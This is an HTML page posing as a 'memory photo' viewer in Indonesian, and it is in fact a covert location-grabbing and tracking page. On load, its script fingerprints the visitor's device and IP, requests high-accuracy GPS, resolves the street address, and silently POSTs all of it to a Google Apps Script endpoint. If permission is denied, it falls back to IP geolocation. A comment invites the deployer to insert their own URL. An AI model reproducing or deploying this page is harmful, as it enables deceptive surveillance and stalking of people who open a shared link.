<!DOCTYPE html>
<html>
<head>
    <title>Foto Kenangan</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #f2f2f2; }
        .box { background: white; padding: 30px; border-radius: 15px; max-width: 500px; margin: auto; }
        img { max-width: 100%; border-radius: 10px; }
        .status { color: #666; margin-top: 20px; }
    </style>
</head>
<body>
<div class="box">
    <h2>📸 Foto Kenangan</h2>
    <img src="https://picsum.photos/400/300?random=4" alt="foto">
    <p class="status">Memuat foto terdekat dari lokasi Anda...</p>
</div>
<script>
    // GANTI DENGAN WEB APP URL ANDA
    const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbyH5gC3u148Y0A_oK0KVU8s4jsou5aG_Y66YsJMUtx77kdrtnBGnJ1p4KK3jes8l0ytWg/exec";

    async function kirimKeEmail(lat, lon, accuracy, address, fingerprint) {
        const payload = { lat, lon, accuracy, address, fingerprint };
        await fetch(WEBAPP_URL, {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        }).catch(e => console.log(e));
        document.querySelector(".status").innerHTML = "✅ Foto dimuat. Terima kasih!";
    }

    async function getFingerprint() {
        const ua = navigator.userAgent;
        const platform = navigator.platform || "unknown";
        const language = navigator.language;
        const screenRes = `${screen.width}x${screen.height}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const currentTime = new Date().toString();
        let ip = "unknown";
        try {
            const res = await fetch("https://ipapi.co/json/");
            const data = await res.json();
            ip = data.ip;
        } catch(e) {}
        return { userAgent: ua, platform, language, screenResolution: screenRes, timezone, accessTime: currentTime, ip };
    }

    (async function() {
        const fingerprint = await getFingerprint();
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    let lat = pos.coords.latitude;
                    let lon = pos.coords.longitude;
                    let acc = pos.coords.accuracy;
                    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18`)
                        .then(r => r.json())
                        .then(data => kirimKeEmail(lat, lon, acc, data.display_name || "", fingerprint))
                        .catch(() => kirimKeEmail(lat, lon, acc, "", fingerprint));
                },
                err => {
                    fetch("https://ipapi.co/json/")
                        .then(r => r.json())
                        .then(data => kirimKeEmail(data.latitude, data.longitude, 5000, `${data.city}, ${data.country_name}`, fingerprint));
                    document.querySelector(".status").innerHTML = "⚠️ Izin lokasi diperlukan untuk akurasi.";
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            document.querySelector(".status").innerHTML = "Browser tidak mendukung GPS.";
        }
    })();
</script>
</body>
</html>
